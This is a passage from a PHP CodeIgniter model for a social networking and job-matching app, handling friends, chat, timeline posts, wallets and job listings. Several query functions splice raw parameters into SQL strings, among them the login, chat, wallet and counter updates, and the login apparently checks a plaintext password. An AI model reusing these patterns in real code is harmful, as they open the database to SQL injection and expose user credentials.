		$this->db->from('linked_account as f'); 
		$this->db->join('customer as c','c.id=f.linked_id','left');
		$this->db->where('f.user_id',$params['id']); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
	
		function insert_video($data){
		$insert = $this->db->insert('videos', $data); 
		$insert_id = $this->db->insert_id();
		if($insert == TRUE) {
		$pid = '4821131221209'.$insert_id;
		$this->db->where('id', $insert_id);
		$this->db->update('videos', array('v_id'=>$pid));	
		}
		return $insert_id;
		
	}
	
		function insert_imagesplash($data){
		$insert = $this->db->insert('gallery', $data); 
		$insert_id = $this->db->insert_id();
		if($insert == TRUE) {
		$pid = '4821131221209'.$insert_id;
		$this->db->where('id', $insert_id);
		$this->db->update('gallery', array('v_id'=>$pid));	
		}
		return $insert_id;
		
	}
	
	function my_friends($id,$limit){ 
		$this->db->select('f.*,c.d_name,f.id,c.image,c.id as customerid');
		$this->db->from('friends as f'); 
		$this->db->join('customer as c','c.id=f.friend_id','left');
		$this->db->where('f.user_id',$id);
		$this->db->where('f.status',1); 
		if($limit!=0) { $this->db->limit(20,$limit); }
		else { $this->db->limit(20); }
		$query = $this->db->get();
		return $query->result_array();
	}
	
		function my_friends_second($id,$limit){ 
	    $this->db->select('f.*,c.d_name,f.id,c.image,c.id as customerid');
		$this->db->from('friends as f'); 
		$this->db->join('customer as c','c.id=f.user_id','left');
		$this->db->where('f.friend_id',$id);  
		$this->db->where('f.status',1); 
		if($limit!=0) { $this->db->limit(20,$limit); }
		else { $this->db->limit(20); }
		$query = $this->db->get();
		return $query->result_array();
	}
	
		function my_friend_request($id,$limit){
		$this->db->select('f.*,c.d_name,f.id,c.image');
		$this->db->from('friends as f'); 
		$this->db->join('customer as c','c.id=f.user_id','left');
		$this->db->where('f.friend_id',$id); 
		$this->db->where('f.status',0); 
		if($limit!=0) { $this->db->limit(10,$limit); }
		else { $this->db->limit(10); }
		$query = $this->db->get();
		return $query->result_array();
	}

	
	function update_vote_counter($table,$id,$amount,$column,$action)
	{
		$this->db->query('UPDATE '.$table.' SET '.$column.' = '.$column.' '.$action.' '.$amount.' where id = "'.$id.'"');	
	}
	
		function delete_manual($table,$where)
{
	$this->db->where($where);
	$this->db->delete($table);
}


function delete_manual_all($table,$where='',$where2='',$where3=''){
		if($where != '') { $this->db->where('user_id',$where2);  }
		if($where2 != '') { $this->db->where('user_id_by',$where); }
		if($where3 != '') { $this->db->where('type',$where3); }
	    $this->db->delete($table);
	}

 function insert_analytics($data){
     
      $this->db->insert('analytics', $data);
    }
		function update_counter($id,$amount,$column,$action)
	{
		$this->db->query('UPDATE customer_count_detail SET '.$column.' = '.$column.' '.$action.' '.$amount.' where user_id = "'.$id.'"');	
	}
	
	function update_video_count($id,$amount,$column)
		{
			$this->db->query('UPDATE videos SET '.$column.' = '.$column.' + '.$amount.' where id = "'.$id.'"');	
		}
	function update_follow_wallet($id,$amount,$column,$action)
	{
		$this->db->query('UPDATE customer SET '.$column.' = '.$column.' '.$action.' '.$amount.' where id = "'.$id.'"');	
	}
	
		/* function select_manual($table,$where='',$where2=''){
		$this->db->select('*');
		$this->db->from($table); 
		if($where != '') { $this->db->where($where); }
		if($where2 != '') { $this->db->where($where2); }
		$query = $this->db->get();
		return $query->result_array();
		
	} */
	
		function select_manual($table,$where='',$where2='',$where3=''){
		$this->db->select('*');
		$this->db->from($table); 
		if($where != '') { $this->db->where($where); }
		if($where2 != '') { $this->db->where($where2); }
		if($where3 != '') { $this->db->where($where3); }
		$query = $this->db->get();
		return $query->result_array();
	}

	function sum_manual($table,$col,$where='',$where2='',$where3=''){
		$this->db->select_sum($col);
		$this->db->from($table); 
		if($where != '') { $this->db->where($where); }
		if($where2 != '') { $this->db->where($where2); }
		if($where3 != '') { $this->db->where($where3); }
		$query = $this->db->get();
		return $query->result_array();
	}
	function sum_manual_wherein($table,$col,$where,$col2='',$where2=''){
		$this->db->select_sum($col);
		$this->db->from($table); 
		$this->db->where($where);
		if(!empty($where2)) { $this->db->where_in($col2,$where2); }
		$query = $this->db->get();
		return $query->result_array();
	}
	
	function count_manual($table,$col,$where='',$where2='',$where3=''){
		$this->db->select($col);
		$this->db->from($table); 
		if($where != '') { $this->db->where($where); }
		if($where2 != '') { $this->db->where($where2); }
		if($where3 != '') { $this->db->where($where3); }
		$query = $this->db->get();
       	$result = $query->num_rows();
        return $result;
	}
		function get_prime_member_by_userid($id)
{
	$this->db->select('*');
	$this->db->from('prime_member');
	$this->db->where('user_id',$id); 
	$this->db->order_by('id','desc');
	$this->db->limit(1);
	$query = $this->db->get();
	return $query->result_array(); 
}
	

	
	
	function bliss_amount_update($id,$amount,$column)
{
	$this->db->query('UPDATE customer SET '.$column.' = '.$column.' - '.$amount.' where id = '.$id.'');	
}
	
	
	
	
	
	
	
	
	
	

	function getfavjob($job_id,$user_id){
        $this->db->select('*');
        $this->db->from($this->jobfavourite);
       $this->db->where('user_id',$user_id);
       $this->db->where('job_id',$job_id);
       $query = $this->db->get();
       $result = $query->num_rows();
        return $result;
    }


function getmerchantRows($params = array()){
        $this->db->select('*');
        $this->db->from($this->merchantTbl);
        
        //fetch data by conditions
        if(array_key_exists("conditions",$params)){
            foreach($params['conditions'] as $key => $value){
                $this->db->where($key,$value);
            }
        }
        
        if(array_key_exists("id",$params)){
            $this->db->where('id',$params['id']);
            $query = $this->db->get();
            $result = $query->row_array();
        }else{
            //set start and limit
            if(array_key_exists("start",$params) && array_key_exists("limit",$params)){
                $this->db->limit($params['limit'],$params['start']);
            }elseif(!array_key_exists("start",$params) && array_key_exists("limit",$params)){
                $this->db->limit($params['limit']);
            }
            
            if(array_key_exists("returnType",$params) && $params['returnType'] == 'count'){
                $result = $this->db->count_all_results();    
            }elseif(array_key_exists("returnType",$params) && $params['returnType'] == 'single'){
                $query = $this->db->get();
                $result = ($query->num_rows() > 0)?$query->row_array():false;
            }else{
                $query = $this->db->get();
                $result = ($query->num_rows() > 0)?$query->result_array():false;
            }
        }

        //return fetched data
        return $result;
    }



    /*
     * Insert user data
     */

	
	

    
    /*
     * Update user data
     */
    public function update($data, $id){
        //add modified date if not exists
        if(!array_key_exists('modified', $data)){
            $data['modified'] = date("Y-m-d H:i:s");
        }
        
        //update user data in users table
        $update = $this->db->update($this->userTbl, $data, array('id'=>$id));
        
        //return the status
        return $update?true:false;
    }
    
	
	
	public function updatejob($data, $id){
        //add modified date if not exists
        if(!array_key_exists('modified', $data)){
            $data['modified'] = date("Y-m-d H:i:s");
        }
        
        //update user data in users table
        $update = $this->db->update($this->jobTbl, $data, array('jid'=>$id));
        
        //return the status
        return $update?true:false;
    }
	
	
	
    /*
     * Delete user data
     */
    public function delete($id){
        //update user from users table
        $delete = $this->db->delete('users',array('id'=>$id));
        //return the status
        return $delete?true:false;
    }

	

    
    
    	function getalljobbyuserid($userid){
        $this->db->select('category');
		$this->db->from('customer');
        $this->db->where('id',$userid);
		$query = $this->db->get();
		 if(count($query->row_array())>0) { 
		
	 $tt=$query->row_array();
	 $product_id = $tt['category'];
     $products = explode(',', $product_id);
    $data = [];

    foreach($products as $products_id) {
        $query = $this->db->query('SELECT * FROM job_details WHERE cat_id = "'.$products_id.'" ');
        $count = $query->num_rows();

        if($count > 0) {
            $data = array_merge($data, $query->result_array());
        }
    }
        
    }
return $data;
		} 	
	
	
	function getalljobbyuserid_bkp($userid){
        $this->db->select('j.*,c.category');
        $this->db->from('job_details as j');
        $this->db->where('c.id',$userid);
        $this->db->join('customer as c','c.category=j.cat_id','left');
		//$this->db->join('sets', 'sets.id LIKE CONCAT("%",questions.id_sets,"%")', false);
        //$this->db->join('favourite_job as f','f.job_id=j.jid','left');
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    } 
    
   
   function jobbyemployee($params = array()){
        $this->db->select('*');
        $this->db->from($this->jobTbl);
        $this->db->where('merchant_id',$params['id']);
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }

    public function insertjob($data){
        //add created and modified date if not exists
        if(!array_key_exists("p_date", $data)){
            $data['p_date'] = date("Y-m-d H:i:s");
        }
        /* if(!array_key_exists("modified", $data)){
            $data['modified'] = date("Y-m-d H:i:s");
        } */
        
        //insert user data to users table
        $insert = $this->db->insert($this->jobTbl, $data);
        
        //return the status
        return $insert?$this->db->insert_id():false;
    }
	
	
	    public function insertfavourite($data){
        //insert user data to users table
        $insert = $this->db->insert($this->jobfavourite, $data);
        //return the status
        return $insert?$this->db->insert_id():false;
          }

		 
	
function getmyfavjob($params = array()){
        $this->db->select('j.*,f.job_id');
        $this->db->from('favourite_job as f');
        $this->db->where('f.user_id',$params['user_id']);
		$this->db->join('job_details as j', 'j.jid = f.job_id');
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }
	
	
	function getemloyeelogin($user_name,$password){
        $this->db->select('*');
        $this->db->from($this->merchantTbl);
		$this->db->where("(email = '$user_name' OR phone = '$user_name')");
       //$this->db->where('email',$user_name);
       $this->db->where('pass_word',$password);
	   $this->db->where('status', 'active');
       $query = $this->db->get();
       $result = $query->row_array();
        return $result;
    }	
	
	
	
	
function getemloyeeRows($params = array()){
        $this->db->select('*');
        $this->db->from($this->merchantTbl);
        
        //fetch data by conditions
        if(array_key_exists("conditions",$params)){
            foreach($params['conditions'] as $key => $value){
                $this->db->where($key,$value);
            }
        }
        
        if(array_key_exists("id",$params)){
            $this->db->where('id',$params['id']);
            $query = $this->db->get();
            $result = $query->row_array();
        }else{
            //set start and limit
            if(array_key_exists("start",$params) && array_key_exists("limit",$params)){
                $this->db->limit($params['limit'],$params['start']);
            }elseif(!array_key_exists("start",$params) && array_key_exists("limit",$params)){
                $this->db->limit($params['limit']);
            }
            
            if(array_key_exists("returnType",$params) && $params['returnType'] == 'count'){
                $result = $this->db->count_all_results();    
            }elseif(array_key_exists("returnType",$params) && $params['returnType'] == 'single'){
                $query = $this->db->get();
                $result = ($query->num_rows() > 0)?$query->row_array():false;
            }else{
                $query = $this->db->get();
                $result = ($query->num_rows() > 0)?$query->result_array():false;
            }
        }

        //return fetched data
        return $result;
    }
	
	
	
	
	
	
	
	function getpackageRows($params = array()){
        $this->db->select('*');
        $this->db->from($this->packagesTbl);
        
        if(array_key_exists("package_for",$params)){
            $this->db->where('package_for',$params['package_for']);
            $query = $this->db->get();
             $result = $query->result_array();
        }

        //return fetched data
        return $result;
    }
	
	
	   function job_delete($job_id,$user_id){
        //update user from users table
        $delete = $this->db->delete('favourite_job',array('job_id'=>$job_id,'user_id'=>$user_id));
        //return the status
        return $delete?true:false;
    }
	
	
	function delete_job($job_id,$user_id){
$this->db->where('job_id', $job_id);
$this->db->where('user_id', $user_id);
$delete=$this->db->delete('favourite_job');
return $delete?true:false;
}

 	function user_bycategory_all($j_id,$catid,$emp_id){ 
        $this->db->select('*');
		$this->db->from('unlock_candidate');
		$this->db->where('emp_id', $emp_id);
		$this->db->where('job_id', $j_id);
		$query = $this->db->get();
        if(count($query->result_array())>0) { 
			$this->db->select('c.*');
        $this->db->from('customer as c');
		 foreach ($query->result() as $row)
	{
	
        $this->db->where('c.id !=',$row->can_id);
	 }
	  $this->db->like('c.category', $catid, 'both'); 
	   //$this->db->where('c.category',$catid);
        $query = $this->db->get();
        $result = $query->result_array();
      }else {
		$this->db->select('*');
        $this->db->from('customer');
		$this->db->like('category', $catid, 'both'); 
        //$this->db->where('category',$catid);
        $query = $this->db->get();
        $result = $query->result_array(); 
		}
      return $result;
	}
	
	/*   function user_bycategory_all($j_id,$catid,$emp_id){
        $this->db->select('c.*');
        $this->db->from('customer as c');
        $this->db->where('c.category',$catid);
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }  */ 
	
	function employertransaction($id){
        $this->db->select('*');
        $this->db->from($this->order);
        $this->db->where('user_id',$id);
        $this->db->where('status','Approved');
        $query = $this->db->get();
        $result = $query->result_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }
	
	function candidatetransaction($id){
        $this->db->select('*');
        $this->db->from($this->order);
        $this->db->where('cust_id',$id);
		$this->db->where('status','Approved');
        $query = $this->db->get();
        $result = $query->result_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }
	
	
	    public function addorder($data){
        //insert user data to users table
        $insert = $this->db->insert($this->order, $data);
        //return the status
        return $insert?$this->db->insert_id():false;
          }
	
	
	 public function unlockcandidate($data){
        //insert user data to users table
        $insert = $this->db->insert($this->unlock_candidate, $data);
        //return the status
        return $insert?$this->db->insert_id():false;
          }
		  
		  
		function getemloyeedata($id){
        $this->db->select('bliss_amount');
        $this->db->from($this->merchantTbl);
        $this->db->where('id',$id);
        $query = $this->db->get();
        $result = $query->row_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }
	
		
   function unlockedcan($params = array()){
        $this->db->select('u.id as uid,c.*');
        $this->db->from('unlock_candidate as u');
        $this->db->where('u.emp_id',$params['id']);
		$this->db->where('u.status','unlocked');
		$this->db->join('customer as c', 'u.can_id = c.id');
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }
	
	   function contactedcan($params = array()){
        $this->db->select('u.status as connected,c.*');
        $this->db->from('unlock_candidate as u');
        $this->db->where('u.emp_id',$params['id']);
		$this->db->where('u.status','connected');
		$this->db->join('customer as c', 'u.can_id = c.id');
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }
	
	
	
	    public function unlockjob($data){
        //insert user data to users table
        $insert = $this->db->insert($this->unlock_job, $data);
        //return the status
        return $insert?$this->db->insert_id():false;
          }
		  
		  
		function getcandidatedata($id){
        $this->db->select('package_amount');
        $this->db->from($this->userTbl);
        $this->db->where('id',$id);
        $query = $this->db->get();
        $result = $query->row_array();
        return $result;
    }	
	
	
	function getexistjob($can_id,$job_id){
        $this->db->select('*');
        $this->db->from('unlock_job');
        $this->db->where('can_id',$can_id);
        $this->db->where('job_id',$job_id);
        $query = $this->db->get();
        $result = $query->num_rows();
        return $result;
    }
	
	function package_amount_update($id,$amount)
{
	$this->db->query('UPDATE customer SET package_amount = package_amount - '.$amount.' where id = '.$id.'');	
}
	


function verifycustomerorder($order_id,$status,$user_id,$payment_id,$amount)
{
$data = array('payment_id' => $payment_id,'status' => $status,);
$this->db->where('order_id', $order_id);
$this->db->update('transaction_summery', $data);
/* if($status=='Approved'){
$this->db->query('UPDATE customer SET package_amount = package_amount + '.$amount.' where id = '.$user_id.'');		
} */

return True;

}
	
	
		
function unlockedjobs($params = array()){
        $this->db->select('u.id,j.*');
        $this->db->from('unlock_job as u');
        $this->db->where('u.can_id',$params['id']);
		$this->db->join('job_details as j', 'u.job_id = j.jid');
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }
	
	public function updatecontactcandidate($data) {
    $this->db->where('id', $data);
    $this->db->update('unlock_candidate', array('status' => 'connected'));
    return true;
}

function get_user_friend_ids($id){
		$this->db->select('f.friend_id,c.userid,c.d_name,c.image,c.id as cid');
		$this->db->from('friends as f'); 
		$this->db->join('customer as c','c.id=f.friend_id','left');
		$this->db->where('f.user_id',$id);
		$this->db->where('f.status',1);
		$this->db->limit(1500);
		$query = $this->db->get();
		return $query->result_array();
	}

	function get_user_friend_ids_second($id){
		$this->db->select('f.friend_id,c.userid,c.d_name,c.image,c.id as cid');
		$this->db->from('friends as f'); 
		$this->db->join('customer as c','c.id=f.user_id','left');
		$this->db->where('f.friend_id',$id);
		$this->db->where('f.status',1);
		$this->db->limit(1500);
		$query = $this->db->get();
		return $query->result_array();
	}
	
		function my_following_list($id){
		$this->db->select('follow_id');
		$this->db->from('followers');
		$this->db->where('user_id',$id);
	//	$this->db->limit(1500);
		$query = $this->db->get();
		return $query->result_array();
	}
	
	
	 function get_timeline_post($userid,$id,$limit){ 
        $this->db->select('t.*,c.l_name,c.f_name,c.d_name,c.image as userimage,COUNT(p.id) as lid');
		$this->db->from('timeline_post as t'); 
		$this->db->join('customer as c','t.user_id = c.id','left');
		$this->db->join('post_likes as p','p.like_id = t.id AND p.user_id = "'.$id.'"','left');
		$this->db->where_in('t.user_id',$userid);
		if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		$this->db->order_by('t.id','desc');
		$this->db->group_by('t.id');
		$query = $this->db->get();
		return $query->result_array();
    }
	
	 function get_timeline_post_by_id($userid,$id){ 
        $this->db->select('t.*,c.f_name,c.l_name,c.image as userimage,COUNT(p.id) as lid');
		$this->db->from('timeline_post as t'); 
		$this->db->join('customer as c','t.user_id = c.id','left');
		$this->db->join('post_likes as p','p.like_id = t.id AND p.user_id = "'.$id.'"','left');
		$this->db->where('t.id',$userid);
		$this->db->group_by('t.id');
		$query = $this->db->get();
		return $query->result_array();
    }
	
	 function get_my_timeline_post($userid,$id,$limit=0){ 
        $this->db->select('t.*,c.d_name,c.f_name,c.l_name,c.image as userimage,COUNT(p.id) as lid');
		$this->db->from('timeline_post as t'); 
		$this->db->join('customer as c','t.user_id = c.id','left');
		$this->db->join('post_likes as p','p.like_id = t.id AND p.user_id = "'.$id.'"','left');
		$this->db->where('t.user_id',$userid);
		if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		$this->db->order_by('t.id','desc');
		$this->db->group_by('t.id');
		$query = $this->db->get();
		return $query->result_array();
    }
	
	
	function get_mylastchat($id){ 
        $this->db->select('t.*,c.d_name,c.image as userimage,c.id as custid');
		$this->db->from('chat_message as t'); 
	
		//$this->db->limit(15); 
		
		//$this->db->join('customer as c','c.id = t.to_user_id AND t.from_user_id = "'.$id.'"','left');
		$this->db->join('customer as c','c.id = t.from_user_id');
		if(!empty($id)){
		//$this->db->where_in('t.to_user_id',$userid);
		
		$this->db->where('t.to_user_id ='.$id.' or t.from_user_id='.$id.'');
		//$this->db->or_where('t.from_user_id',$id);
		$this->db->where('t.from_user_id!=',$id);
		
		$this->db->group_by('t.from_user_id');
		
		
		}
		$this->db->order_by('t.id','DESC');
		$this->db->limit(10); 
		$query = $this->db->get();
		return $query->result_array();
    }
	
	function my_recomended_list($userid){
		$this->db->select('c.id,c.d_name,c.image,c.userid');
		$this->db->from('customer as c');
		$this->db->join('friends as fr','fr.friend_id !='.$userid.' OR fr.user_id !='.$userid.'','left');
		$this->db->order_by('c.id','RANDOM');
		$this->db->where('c.image!=','');
		$this->db->limit(15); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
	function topcreator_list($userid){
		$this->db->select('c.id,c.d_name,c.image,c.userid,cc.followers');
		$this->db->from('customer_count_detail as cc');
		$this->db->join('customer as c','c.id=cc.user_id','left');
		//$this->db->join('followers as fr','fr.user_id !='.$userid.'','left');
		$this->db->order_by('c.id','RANDOM');
		$this->db->where('c.image!=','');
		$this->db->limit(15); 
		$query = $this->db->get();
		return $query->result_array();
	}
	function topcreator($id,$limit){
		$this->db->select('v.user_id,c.d_name,c.image,COUNT(fr.id) as frstatus,fr.status as req_status,fr.user_id as use_id,fr.friend_id');
		$this->db->from('videos as v'); 
		$this->db->join('customer as c','c.id=v.user_id','left');
		$this->db->join('friends as fr','fr.friend_id='.$id.' AND fr.user_id=c.id OR fr.user_id='.$id.' AND fr.friend_id=c.id','left');
		if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		$this->db->where('c.image!=','');
		$this->db->group_by('v.user_id'); 
		$this->db->order_by('v.id','ASC'); 
		$query = $this->db->get();
		return $query->result_array();
	}
	
    function topcreatordemo($id,$limit){
		$this->db->select('c.id as user_id,c.d_name,c.image');
		$this->db->from('customer as c'); 
		if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		$this->db->where_not_in('c.id',$id);
		//$this->db->group_by('v.user_id'); 
		$this->db->order_by('c.id','asc'); 
		$query = $this->db->get();
		return $query->result_array();
	}


 
	
		 function add_chat_msg($data)
    {
		$insert = $this->db->insert('chat_message', $data);
		return $insert;
	} 
	
		function get_chat_msg($to,$from) {
		$this->db->select('ch.*,c.image');
		$this->db->from('chat_message as ch');
		$this->db->join('customer as c','c.id=ch.from_user_id','left');
		$this->db->where("(ch.to_user_id = '$to' AND ch.from_user_id = '$from' OR ch.to_user_id = '$from' AND ch.from_user_id = '$to')");
		$this->db->order_by('ch.id', 'ASC');	
		$query = $this->db->get();
		return $query->result_array();
	}
	
		function get_chat_msg_new($to,$from) {
		$this->db->select('ch.*,c.image');
		$this->db->from('chat_message as ch');
		$this->db->join('customer as c','c.id=ch.from_user_id','left');
		$status = $from.',';
		$this->db->where("(ch.to_user_id = '$to' AND ch.from_user_id = '$from' OR ch.to_user_id = '$from' AND ch.from_user_id = '$to') && ch.status not like '%$status%'");
		$this->db->order_by('ch.id', 'ASC');	
		$query = $this->db->get();
		return $query->result_array();
	}
	
	
	function update_chat_old($to,$from)
	{
$status = ','.$from;
$this->db->where("(to_user_id = '$to' AND from_user_id = '$from' OR to_user_id = '$from' AND from_user_id = '$to') && status not like '%$status%'");
$this->db->set('status', "CONCAT(status,',','".$from."')", FALSE); 
$this->db->update('chat_one');
	}
	
	
	function update_chat($user_chat,$user) { 
        $status = $user.',';
        $this->db->query("update chat_message set status=concat(status,'$status') where (to_user_id='$user_chat' && from_user_id='$user' || to_user_id='$user' && from_user_id='$user_chat') && status not like '%$status%'");
	}
	
	 function chitchat_list($limit){
		$this->db->select('*');
		$this->db->from('merchants'); 
		$this->db->where('status','active');
		if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		$this->db->order_by('id','RANDOM');
		$query = $this->db->get();
		return $query->result_array();   
	}
	function chitchatuserdata($params = array()){
        $this->db->select('*');
        $this->db->from('merchants');
		$this->db->where('id',$params['id']);
        $query = $this->db->get();
		return $query->result_array();
    }
	
		function chitchatuserprofile($params = array()){
        $this->db->select('*');
        $this->db->from('portfolio');
		$this->db->where('merchant_id',$params['userid']);
        $query = $this->db->get();
		return $query->result_array();
    }
    	function profile($id){
		$this->db->select('c.*,d.id as did,d.prime as dprime,d.d_name as ddname');
		$this->db->from('customer as c');
		$this->db->join('customer as d','d.customer_id=c.parent_customer_id','left');
		$this->db->where('c.id',$id);
		$query = $this->db->get();
		return $query->result_array(); 
	}
	
	function get_alle_chitchat_by_search($search,$id){
        $this->db->select('*');
        $this->db->from('merchants');
		 if($search != ''){
      $this->db->like('d_name', $search);
      $this->db->or_like('city', $search);
      $this->db->or_like('state', $search);
    }
	$this->db->limit(15); 
        $query = $this->db->get();
		return $query->result_array();
    }
	
	function get_alle_social_by_search($search,$id){
        $this->db->select('id,customer_id,d_name,city,image');
        $this->db->from('customer');
		 if($search != ''){
      $this->db->like('d_name',$search, 'both'); 
      $this->db->or_like('city', $search);
      $this->db->or_like('state', $search);
    }
	$this->db->limit(20); 
        $query = $this->db->get();
		return $query->result_array();
    }
	function suggestion_fetch($cat,$merchant_id)
{
	$this->db->select('*');
	$this->db->from('merchants');
	$this->db->where('category',$cat);
	$this->db->where('id !=',$merchant_id);
	$this->db->where('status','active');
	$this->db->limit(4);
	$query = $this->db->get();
	return $query->result_array(); 
}
	
	
	function getuserpdata($params){
            $this->db->select('*');
            $this->db->from('customer');
    		$this->db->where('id',$params);
            $query = $this->db->get();
    		return $query->result_array();
        }
		
		 function redeem_bliss_request($data)
    {
		$insert = $this->db->insert('redeem_bliss', $data);
	
    }
	
		 function update_wallet($id,$amount)
	{
$this->db->query('UPDATE customer SET bliss_amount ='.$amount.' where id = "'.$id.'"');	
	}
	
		function user_chat_data($id){
        $this->db->select('f_name');
        $this->db->from('customer');
		$this->db->where('id',$id);
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }

	function user_chat_data1($id){
        $this->db->select('device_id');
        $this->db->from('customer');
		$this->db->where('id',$id);
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    } 	
	

	
	function active_frames(){
	$this->db->select('*');
	$this->db->from('banner');
	$this->db->where('type','frame');
	$this->db->where('status','active');
	$query = $this->db->get();
	return $query->result_array(); 
	}

	function update_logoutid($insert)
	{
$data = array('device_id' =>'');
$this->db->where('id', $insert);
$this->db->update('customer', $data);
	}
	
	function hostcategory($id){
        $this->db->select('c_name');
        $this->db->from('categorys');
        $this->db->where('id',$id);
        $query = $this->db->get();
        $result = $query->result_array();
        return $result;
    }
	
		function sound_category(){
        $this->db->select('*');
        $this->db->from('sound_categorys');
		$this->db->where('status','active');
		$this->db->order_by('order_by','asc');
        $query = $this->db->get();
        $result = $query->result_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }
	
	function sound_all($id){
        $this->db->select('*');
        $this->db->from('sound');
		$this->db->where('category',$id);
        $query = $this->db->get();
        $result = $query->result_array();
		//return $query->result_array();
        //return fetched data
        return $result;
    }
	
	function getsoundbycategory($params = array()){
		$limit=$params['loadmore'];
		$this->db->select('*');
		$this->db->from('sound');
		$this->db->where('category',$params['id']);
		$this->db->where('status','approved');
		$this->db->order_by('sound_id','DESC');
		if($limit!='0'){$this->db->limit(20,$limit);}else{$this->db->limit(20);}
		//if($params['loadmore']!=''){$this->db->where_not_in('v.id',json_decode($params['loadmore'],true));}
		//$this->db->limit(20);
		$query = $this->db->get();
		return $query->result_array();
	} 
			
}